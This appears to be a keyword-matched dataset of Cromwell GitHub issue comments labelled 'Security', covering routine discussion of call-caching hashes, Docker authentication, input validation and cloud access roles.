Security,"This should be a dynamic assert, based on the results of the task.; validation can take a while, so I would like the output to be taken and; given to the next task in the workflow while the validation is happening. I; would also like to control the response of the run (fail and stop, fail but; continue, warn and continue, do not validate) if there's an assertion; failure. On Tue, Jan 31, 2017 at 12:57 AM, Linlin Yan <notifications@github.com>; wrote:. > Sounds like some syntactic sugars are expected to simplify the fail method; > declaration.; >; > In addition, will such 'assert' be dynamic (in run-time) or static (in; > parse-time, before running any task)?; >; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/1146#issuecomment-276281986>,; > or mute the thread; > <https://github.com/notifications/unsubscribe-auth/ACnk0is0FEJp23Rx_5cXqrSPWKK8d2h_ks5rXs1ggaJpZM4JJrWM>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1146#issuecomment-276362089:68,validat,validation,68,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1146#issuecomment-276362089,6,['validat'],"['validate', 'validation']"
Security,"This turns out to be easy to explain. Every file hash was being checked against the google API and was a fully blocking operation (complete with blocking retries). While within a call each file was checked serially (a problem in and of itself), when there were many calls running at once w/ File objects they'd each sit there and block. That's not a recipe for success",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/794#issuecomment-235082067:49,hash,hash,49,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/794#issuecomment-235082067,1,['hash'],['hash']
Security,This would be useful to us as well. We have a similar case where we have a large reference collection that we don't want to have to fetch every time. For our now AWS deploys we can override the submit-docker parameter to add the mount. But this isn't exposed for this backend. It would be nice if we could fully customize the docker command similar to what is possible with ConfigBackendLifecycleActorFactory.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4579#issuecomment-754945786:251,expose,exposed,251,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4579#issuecomment-754945786,1,['expose'],['exposed']
Security,"Though I guess if they really are pluggable backends, then somebody can create their own SBT project and include whatever they want as long as it exposes a class that adheres to the Actor interface. So we really can't stop differing versions of Akka or any other shared package, right?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/495#issuecomment-192392206:146,expose,exposes,146,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/495#issuecomment-192392206,1,['expose'],['exposes']
Security,"Thoughts for a Monday Tech Talk™️:. Say we run a workflow with a 100-wide scatter and the floating Docker tags are resolved to hashes during workflow initialization. 90 of the jobs launch, but then the server goes down. The server comes up some time later and recovers the first 90 running jobs, but in the meantime the floating Docker tag has moved to a new version. We rerun the workflow initialization and calculate a different hash for the remaining 10 shards of the scatter. . It seems the hash for a Docker tag for a particular workflow should be persisted to be able to handle this case. I also wonder per @cjllanwarne if we shouldn't keep this activity in the `JobPreparationActor` to avoid knowingly creating a system that we'll have to replace when we implement dynamic dispatch. Keeping this in `JobPreparationActor` would also give us greater ability to resolve expressions for Docker tags than if we do this earlier in the workflow lifecycle.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2048#issuecomment-289168497:127,hash,hashes,127,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2048#issuecomment-289168497,3,['hash'],"['hash', 'hashes']"
Security,"To accept this bug report, we would probably ask the user to try; ```; gsutil -q -m cp gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list ~/test_file; ```; on their local machine to make sure permissions are workable and it's really Cromwell that is screwing up. Unfortunately the user is no longer at Broad (hi Lee!) and I am not aware of a systemic problem in this area, so I will close the issue.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1960#issuecomment-665698064:112,access,access,112,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1960#issuecomment-665698064,1,['access'],['access']
Security,"To clarify @geoffjentry: if `write_lines` is in a declaration (e.g. `File fofn = write_lines(file_refs)`) then that's evaluated and used for CC (and with changeable paths being hashed, CC will miss, just like today). . So to make CC work as you'd want in this new scheme, the `write_lines` would have to be in the command block (e.g. `command { ./foo.sh write_lines(file_refs) }`).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2309#issuecomment-305989869:177,hash,hashed,177,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2309#issuecomment-305989869,1,['hash'],['hashed']
Security,"To clarify the current situation... Most of these ""don't affect the results"" attributes are indeed ignored for call caching. But workflow inputs are all used. So, if it's a hard-coded value it won't be call cached, but if the attribute is set by an expression based on an input, the input value will be hashed even if the runtime attribute value isn't. Hope that made sense...",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2927#issuecomment-348292881:303,hash,hashed,303,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2927#issuecomment-348292881,1,['hash'],['hashed']
Security,"To effectively use ""Retry with More Memory"" for JVM jobs running on Papi one has to use `MEM_SIZE` and `MEM_UNIT` to run with the correct memory settings. But those variables were not available on any other backends. Therefore one ended up having to use other creative options for [authoring multi-backend WDL](https://github.com/broadinstitute/warp/issues/481) such as using [`free`](https://github.com/broadinstitute/warp/pull/197/files/ae14bee73c07684b97dad22b8f3de53ff6404afe..f0692505010baa576f9fe09578fa001661a55145#r735883251). This PR exposes those two environment variables to the `command` block on any Cromwell ""standard"" backend that supports the `memory` runtime attribute. Using the environment variables also helps with call caching java jobs. One can use something along the lines of `-Xmx${MEM_SIZE%.*}${MEM_UNIT%?}` in a version 1.0+ WDL and the command block will stay the same even if the memory needs to be increased. <hr/>. Side note: If anyone comes across this PR and wonders why the default `Local` backend doesn't support `MEM_SIZE` and `MEM_UNIT` it's because the Local backend does not use `memory` (nor `cpu` at the moment). The `memory` runtime attribute would need to be added into the [runtime attributes](https://github.com/broadinstitute/cromwell/blob/79/core/src/main/resources/reference_local_provider_config.inc.conf#L9-L12) with something like:. ```hocon; runtime-attributes = """"""; String? docker; String? docker_user; Int memory_mb = 2048; """"""; ```. And then inside [`submit-docker`](https://github.com/broadinstitute/cromwell/blob/79/core/src/main/resources/reference_local_provider_config.inc.conf#L14-L34) use `--memory=${memory_mb}m`. Then the changes in this PR will generate `MEM_SIZE` and `MEM_UNIT` for the Local backend too.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6766#issuecomment-1133753430:543,expose,exposes,543,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6766#issuecomment-1133753430,1,['expose'],['exposes']
Security,"To keep ourselves honest, and convince ourselves that this is a swappable service rather than a core part of cromwell, I would like to see all of the metadata database access stuff in the `services.metadata` package rather than the engine's `dataAccess` parts",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/851#issuecomment-220343998:168,access,access,168,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/851#issuecomment-220343998,1,['access'],['access']
Security,"To make it less of a blind hunt, it's also possible to look into your Stackdriver Audit logs - they should list all GCP API calls in your project that failed with 403. This way you can get a better sense of which ones Cromwell is actually using. I've been meaning to write a tool to simplify this kind of analysis, but you can do it with the logs even now.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4304#issuecomment-685185759:82,Audit,Audit,82,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4304#issuecomment-685185759,1,['Audit'],['Audit']
Security,Travis thinks you forgot to update some hash expectations,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/616#issuecomment-201246839:40,hash,hash,40,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/616#issuecomment-201246839,1,['hash'],['hash']
Security,"Unfortunately the `Directory` type is a feature of a not-currently-supported WDL version. . You can probably get preview-level access to this via `version development` but I certainly wouldn’t rely on features there yet. They might change - or disappear completely - as part of development of WDL 1.1 and subsequent version. In fact, WDL 1.1 explicitly does NOT include the `Directory` type so even the current level of support may be temporarily removed in future versions of Cromwell, until we start development on a version of WDL which does include the type. The good news is that if and when we do officially support the `Directory` type in that future version of WDL, we will support proper handling of the type, including call caching, but the bad news is that it’s not an active development priority right now, so I can’t give you a proper timeline for support. Sorry!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6509#issuecomment-936922021:127,access,access,127,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6509#issuecomment-936922021,1,['access'],['access']
Security,"Using raw SQL query which uses table join to find match in the prefix hints:. <img src=""https://user-images.githubusercontent.com/16748522/47813043-4d472400-dd20-11e8-9181-49d45fc56425.png"" width=""50%"" height=""50%"">. Legend:; Blue line- the query checks whether a call cache entry exists for the base aggregation hash; Orange line- the query retrieves 1 call cache entry matching the base aggregation hash and input files aggregation hash. Same database as above was used.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4266#issuecomment-434814687:313,hash,hash,313,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4266#issuecomment-434814687,3,['hash'],['hash']
Security,"Using raw SQL query with multiple OR conditions to find match in the prefix hints:. <img src=""https://user-images.githubusercontent.com/16748522/47726893-c6b41900-dc31-11e8-9d33-3120309fb152.png"" width=""50%"" height=""50%"">. Legend:; Blue line- the query checks whether a call cache entry exists for the base aggregation hash; Orange line- the query retrieves 1 call cache entry matching the base aggregation hash and input files aggregation hash. The database against which the queries were executed has following row count (Call Caching related tables):; CALL_CACHING_AGGREGATION_ENTRY: 102543; CALL_CACHING_DETRITUS_ENTRY: 615258; CALL_CACHING_ENTRY: 102543; CALL_CACHING_HASH_ENTRY: 4818285; CALL_CACHING_SIMPLETON_ENTRY: 1011390",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4266#issuecomment-434334361:319,hash,hash,319,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4266#issuecomment-434334361,3,['hash'],['hash']
Security,"Via ""the docker"":. ```; [2018-03-03 01:11:21,96] [info] SingleWorkflowRunnerActor workflow finished with status 'Succeeded'.; { ; ""outputs"": {; ""workflow.cwl.mark_duplicates_metrics_file"": {; ""format"": null,; ""location"": ""/root/cromwell-executions/workflow.cwl/b745d4f8-aa09-402c-b612-fb112fe8d983/call-mark_duplicates_and_sort/execution/mark_dups_metrics.txt"",; ""size"": null,; ""secondaryFiles"": [],; ""contents"": null,; ""checksum"": null,; ""class"": ""File""; },; ""workflow.cwl.final_cram"": {; ""format"": null,; ""location"": ""/root/cromwell-executions/workflow.cwl/b745d4f8-aa09-402c-b612-fb112fe8d983/call-index_cram/execution/final.cram"",; ""size"": null,; ""secondaryFiles"": [""/root/cromwell-executions/workflow.cwl/b745d4f8-aa09-402c-b612-fb112fe8d983/call-index_cram/execution/final.cram.crai"", ""/root/cromwell-executions/workflow.cwl/b745d4f8-aa09-402c-b612-fb112fe8d983/call-index_cram/execution/final.crai""],; ""contents"": null,; ""checksum"": null,; ""class"": ""File""; }; },; ""id"": ""b745d4f8-aa09-402c-b612-fb112fe8d983""; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3350#issuecomment-370128184:421,checksum,checksum,421,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3350#issuecomment-370128184,2,['checksum'],['checksum']
Security,"We also ran for a while and got extra `glob` folders in our paths via the workflow options:. ```json; {; ""final_workflow_outputs_dir"": ""xxx"",; ""use_relative_output_paths"": true; }; ```. For anyone running their instances on a fork, or if someone wants to ask the Cromwell devs to see if this is a breaking change, on our instance I briefly tried out modifying [this line](https://github.com/broadinstitute/cromwell/blob/87/engine/src/main/scala/cromwell/engine/workflow/lifecycle/finalization/CopyWorkflowOutputsActor.scala#L124):. ```scala; lazy val truncateRegex = "".*/call-[^/]*/(shard-[0-9]+/)?(cacheCopy/)?(attempt-[0-9]+/)?(execution/)?"".r; ```. to:. ```scala; lazy val truncateRegex = "".*/call-[^/]*/(shard-[0-9]+/)?(cacheCopy/)?(attempt-[0-9]+/)?(execution/)?(glob-[0-9a-f]+/)?"".r; ```. It seemed to work, removing the glob folder from files copied into xxx. However, I ultimately pursued a different implementation. Using a customized external tool, we now only copy outputs reported as `File` or `Directory` by the `/describe` endpoint, which we are already using for validation.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5524#issuecomment-2113647854:1078,validat,validation,1078,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5524#issuecomment-2113647854,1,['validat'],['validation']
Security,"We can't really make our images private because we want our workflows to be publicly accessible, especially for Terra users. We can make mirrors of our GCR image repositories across regions -- hopefully that will eliminate this type of event for the most part. But we'll still be dependent on our users to to use the right mirrors (as @freeseek just noted above).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6235#issuecomment-884347729:85,access,accessible,85,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6235#issuecomment-884347729,1,['access'],['accessible']
Security,We currently do have basic backend validation. Closing this on the expectation that we can always have a more specific new ticket if necessary.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/811#issuecomment-254296481:35,validat,validation,35,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/811#issuecomment-254296481,2,['validat'],['validation']
Security,"We currently support dockerhub, google container registry and quay as far as looking up hashes is concerned. With the way things are currently, if one of those services goes down or has a high error rate forcing us to retry a lot, all lookups will potentially be slowed down even if they target a service that is doing fine.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2329#issuecomment-332941637:88,hash,hashes,88,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2329#issuecomment-332941637,1,['hash'],['hashes']
Security,"We don't typically patch releases, but we do make the latest version from `develop` available in a Docker image. Folks who want the latest changes between major releases are advised to use these development versions, ex. `87-225ea5a`, which are named with the next major version and short hash of the merge commit. https://hub.docker.com/r/broadinstitute/cromwell/tags",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7238#issuecomment-1885342414:289,hash,hash,289,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7238#issuecomment-1885342414,1,['hash'],['hash']
Security,"We experience this issue in a production environment, too. It's a big problem because in our environment cromwell is part of an automated system that collects new data, runs analysis workflows, and accessions the results to a public archive. Part of the provenance metadata that goes along with workflow runs is the docker image id that was used during the run. Having a value for that key be missing sometimes breaks the code that passes that important provenance information on to the next level of metadata.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4001#issuecomment-557754879:198,access,accessions,198,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4001#issuecomment-557754879,1,['access'],['accessions']
Security,We had to add prepend `docker.io` to the image name to get authentication to work so `docker.io/broadinstitute/cloud-cromwell`,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2318872470:59,authenticat,authentication,59,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2318872470,1,['authenticat'],['authentication']
Security,"We have historically promoted the idea that task outputs should be pure functions of their inputs, so there is no support for data injection. Such injection would not be captured e.g. for purposes of comparing task identity for call caching.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7137#issuecomment-1591275893:131,inject,injection,131,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7137#issuecomment-1591275893,2,['inject'],['injection']
Security,"We have not consistently been able to keep the JIRA board configured for the partial public access we need. The JIRA instance is shared by many groups and has to meet a lot of compliance needs, and the Cromwell access seems to get lost in the shuffle. I think it's more likely that we will remove the link to JIRA and suggest sticking to Github issues.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5031#issuecomment-1097501783:92,access,access,92,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5031#issuecomment-1097501783,2,['access'],['access']
Security,"We have users with the same use case as the second paragraph: ""most of your workflow worked well but fails in the end. You figure out the problem and you do not want to start it from the very beginning as intermediate results are already recorded to the Cromwell-execution folder"". More specifically, the harder case is when you have a scatter (say 100 way wide) and 98 succeed, but the other two fail. You figure out what changes to your command/docker that would fix this and you want to resume those with this change. Since Cromwell would only rerun for these failed tasks it wouldn't cause call caching confusion (rerun the succeeded tasks again), and these new runs would call cache to different hashes than had the original cached. If you were to run this same workflow again with the same data, those 98 that succeeded would not be able to call cache because you changed your task or docker, but I feel this is fine.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2023#issuecomment-360594970:701,hash,hashes,701,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2023#issuecomment-360594970,2,['hash'],['hashes']
Security,"We now serenade users with the delightful error. ```; ""failures"": [; {; ""causedBy"": [; {; ""message"": ""Failed to evaluate 's' (reason 1 of 1):; Evaluating read_string(\""https://sa1314b2aa9c1b89e6b409.blob.core.windows.net/sc-1314b2aa-2f7a-4524-9aba-9c1b89e6b409/test-data/inputFile.txt\"") failed:; Failed to read_string(\""https://sa1314b2aa9c1b89e6b409.blob.core.windows.net/sc-1314b2aa-2f7a-4524-9aba-9c1b89e6b409/test-data/inputFile.txt\"") (reason 1 of 1):; [Attempted 1 time(s)] - ApiException: ; <!DOCTYPE HTML PUBLIC \""-//IETF//DTD HTML 2.0//EN\"">\n<html><head><script src=\""https://us.jsagent.tcell.insight.rapid7.com/tcellagent.min.js\"" tcellappid=\""FCNonprod-NaVu9\"" tcellapikey=\""AQQBBAFLGLOxL7VE9IF9ESlLvCxD5Ykr_7xkQKq_rgn_P58IWjOhOzIh6p3aI4pTWaprlUw\"" tcellbaseurl=\""https://us.agent.tcell.insight.rapid7.com/api/v1\""></script>\n<title>401 Unauthorized</title>\n</head><body>\n<h1>Unauthorized</h1>\n<p>This server could not verify that you\nare authorized to access the document\nrequested. Either you supplied the wrong\ncredentials (e.g., bad password), or your\nbrowser doesn't understand how to supply\nthe credentials required.</p>\n</body></html>\n"",; ""causedBy"": []; }; ],; ""message"": ""Workflow failed""; }; ]; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6965#issuecomment-1341933357:956,authoriz,authorized,956,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6965#issuecomment-1341933357,3,"['access', 'authoriz', 'password']","['access', 'authorized', 'password']"
Security,"We received a workaround from Travis support and I was able to rotate the Vault access token. Follow details over at https://support.travis-ci.com/hc/en-us/requests/3231 but the TL;DR is to use the travis rest-api **V3**, not the travis web-ui nor the travis cli.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4585#issuecomment-457671476:80,access,access,80,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4585#issuecomment-457671476,1,['access'],['access']
Security,We talked about this with Ruchi and I guess we could be very forgiving in the way we validate those docker strings. If it ends up being an invalid docker image the job won't run anyway when we get to that point so..,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2797#issuecomment-340481018:85,validat,validate,85,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2797#issuecomment-340481018,1,['validat'],['validate']
Security,"We're getting into automatic docker tag generation, so I could see getting; beyond 255. On Aug 17, 2016 8:47 PM, ""Lee Lichtenstein"" lichtens@broadinstitute.org; wrote:. > +1 for 1024; > ; > On Aug 17, 2016 5:09 PM, ""mcovarr"" notifications@github.com wrote:; > ; > > HASH_VALUE in CALL_CACHING_HASH is VARCHAR(255), so we shouldn't have; > > this particular problem. But given that the Docker hashes we generate are; > > functions of Docker image names and those seem to have the potential to be; > > very long, we might want to think about an even larger field.; > > ; > > —; > > You are receiving this because you were mentioned.; > > Reply to this email directly, view it on GitHub; > > https://github.com/broadinstitute/cromwell/issues/1301#issuecomment-240549174,; > > or mute the thread; > > https://github.com/notifications/unsubscribe-auth/ACDXkyM0b_81HFK68jJ5Hn71QHaO9qOwks5qg3h-gaJpZM4JmwYu; > > .",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1301#issuecomment-240594318:392,hash,hashes,392,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1301#issuecomment-240594318,1,['hash'],['hashes']
Security,"We're trying to run on HPC cluster and would prefer to lower the load on the filesystem as much as possible. If we use any of the hashing based caching mechanisms, it hits the filesystem hard which tends to slow everything down. Our production is currently running with ""fingerprint"" and hardlink with singularity containers. The samba mounts on the nodes can do 2Gbps and my cromwell server instance maxes it out pretty much right away. On top of that, doing that much IO over a GPFS mount lead to an increase in GPFS buffer size which balooned enough to kill cromwell server process. We'd like to use ""path+modtime"", so we'd prefer a softlink option. We tested this internally and it works as long as the target location is mounted within the singularity containers at the same location. We also think that cromwell should let the users softlink if they so choose, perhaps with a warning if they're running containers.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6676#issuecomment-1040380663:130,hash,hashing,130,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6676#issuecomment-1040380663,1,['hash'],['hashing']
Security,"Well, here's a use case. I want to run the same workflow on exomes and on whole genomes, and some of my parameters take different defaults depending on the data type. It would be swell to be able to say e.g. `my_param = param_values[data_type]` assuming I've set up my defaults as maps with e.g. 'wgs' and 'exome' as keys, and I can somewhere set `data_type = 'wgs'` (because presumably several values would need to be switched) (by the way, does wdl have enums?). So I'd have defaults that are variable references -- but I might decide to use something else entirely and just input my_workflow.my_param = 5 in my json for whatever reason. . Is that crazy/wrong?. I guess I could instead do the override by injecting the value I want into `param_values`...? But then I'm constrained to work with whatever `data_types` have been planned for and can't add something different on the fly. . Does any of this make sense?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2565#issuecomment-323826098:707,inject,injecting,707,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2565#issuecomment-323826098,1,['inject'],['injecting']
Security,"What authentication mode are you running in (default credentials, service account or refresh token)? Does your config make use of private dockerhub credentials. I'm wondering why it's writing an authorization at all.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1644#issuecomment-257870895:5,authenticat,authentication,5,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1644#issuecomment-257870895,2,"['authenticat', 'authoriz']","['authentication', 'authorization']"
Security,"What behavior would be desired, in this case? One required behavior would be that the workflow should still run (I presume). Anything else? @geoffjentry @ruchim . Is this the same as if the user specifies a table to which they don't have access?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5028#issuecomment-502198188:238,access,access,238,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5028#issuecomment-502198188,1,['access'],['access']
Security,"When rebasing and resolving conflicts this PR will need to be rewired, starting with:. ```scala; object JesRuntimeAttributes {; val runtimeAttributesBuilder: StandardValidatedRuntimeAttributesBuilder = …. private val zonesValidation: RuntimeAttributesValidation[Vector[String]] =; ZonesValidation.withDefault(WdlString(ZoneDefaultValue)). def apply(validatedRuntimeAttributes: ValidatedRuntimeAttributes): JesRuntimeAttributes = …; ```. converted to:. ```scala; object JesRuntimeAttributes {; def runtimeAttributesBuilder(jesConfiguration: JesConfiguration): StandardValidatedRuntimeAttributesBuilder = . private def zonesValidation(defaultZones: NonEmptyList[String]): RuntimeAttributesValidation[Vector[String]] =; ZonesValidation.withDefault(WdlString(defaultZones.toList.mkString("",""))). def apply(validatedRuntimeAttributes: ValidatedRuntimeAttributes,; jesConfiguration: JesConfiguration): JesRuntimeAttributes = …; ```. This should be fine for plumbing from the main code, as each caller has a jesConfiguration. The test code may need some refactoring and/or mocks-- or the JRA object can add overloads, that in addition to receiving jesConfigurations, can take a nel of default zones.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1797#issuecomment-271135773:349,validat,validatedRuntimeAttributes,349,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1797#issuecomment-271135773,4,"['Validat', 'validat']","['ValidatedRuntimeAttributes', 'validatedRuntimeAttributes']"
Security,"When using the `PAPIv2` backend, I have noticed that the same previous set of roles is not sufficient to be able to run the pipelines. Instead, after a long and tedious amount of work, I have figured that the following set of roles:; 1) [Cloud Life Sciences](https://cloud.google.com/life-sciences/docs/concepts/access-control#roles) Workflows Runner (`lifesciences.workflowsRunner`); 2) [Service Account User](https://cloud.google.com/iam/docs/service-accounts#user-role) (`iam.serviceAccountUser`); 3) [Firebase Develop](https://firebase.google.com/docs/projects/iam/roles-predefined-category#analytics_roles) Admin (`firebase.developAdmin`). are sufficient to run a pipelne on Google Cloud through a service account. I suppose that `lifesciences.workflowsRunner` is a replacement for `genomics.pipelinesRunner`, but I have no idea why `firebase.developAdmin` is required (or what else should be required in its place). To save my life, I could not find this information anywhere in the Cromwell documentation nor evince it from the Cromwell error messages themselves (nor understand what the `firebase.developAdmin` roles actually allows).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4304#issuecomment-680282059:312,access,access-control,312,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4304#issuecomment-680282059,1,['access'],['access-control']
Security,"While exploring the idea of using a `monitoring_image` for this, I noticed it injects more or less the metadata I'd want into the monitoring container via environment variables already: . https://github.com/broadinstitute/cromwell/blob/adb8d2ad87cba307e5b1eccd1a3e21857cc9b81c/supportedBackends/google/pipelines/v2beta/src/main/scala/cromwell/backend/google/pipelines/v2beta/api/MonitoringAction.scala#L36. https://github.com/broadinstitute/cromwell/blob/adb8d2ad87cba307e5b1eccd1a3e21857cc9b81c/supportedBackends/google/pipelines/common/src/main/scala/cromwell/backend/google/pipelines/common/monitoring/Env.scala#L18. Is there a reason this could not also be injected into UserActions, and would you accept a PR that does so? (As a side note, it seems the monitoring image could likely accomplish what we want as well, but using one on Terra, or setting any custom workflow options is not allowed as far as I know).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7137#issuecomment-1590042851:78,inject,injects,78,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7137#issuecomment-1590042851,2,['inject'],"['injected', 'injects']"
Security,"With `docker.io` prepended the job succeeds in Cromwell and GCP Batch with the below config. It fails without the `docker.io` prepend due to GCP Batch requiring it. There is a docker hash lookup error from the `WorkflowDockerLookupActor`. Error below. We can discuss more on meeting today. ```; config {; dockerhub {; token = ""base64-encoded-docker-hub-username:password""; }; ``` . ```; [2024-08-30 13:56:20,10] [warn] BackendPreparationActor_for_c5f3f88a:myWorkflow.myTask:-1:1 [c5f3f88a]: Docker lookup failed; java.lang.Exception: Failed to get docker hash for docker.io/dspeck/pull-test1:v1 Request failed with status 401 and body {""details"":""incorrect username or password""}; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2321463479:183,hash,hash,183,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2321463479,4,"['hash', 'password']","['hash', 'password']"
Security,With the new caching heuristic for generating File input hashes (`path+modtime`) relies on soft-linking for it to work correctly. Having soft-links disabled by design when containerizing a task makes this option mood. I consider it weird that a config option has a hard-override within cromwell... leave it up to users to configure their backend.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2620#issuecomment-482549494:57,hash,hashes,57,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2620#issuecomment-482549494,1,['hash'],['hashes']
Security,"Womtool on the command line takes wildly longer, probably all due to JVM startup cost; ```; anichols@wm97a-a85 ~/Dropbox/Broad Institute/Bugs/cromwell-4573 $ time womtool validate cpu_WDL.wdl . real	0m3.585s; user	0m7.393s; sys	0m0.552s; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4573#issuecomment-458340601:171,validat,validate,171,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4573#issuecomment-458340601,1,['validat'],['validate']
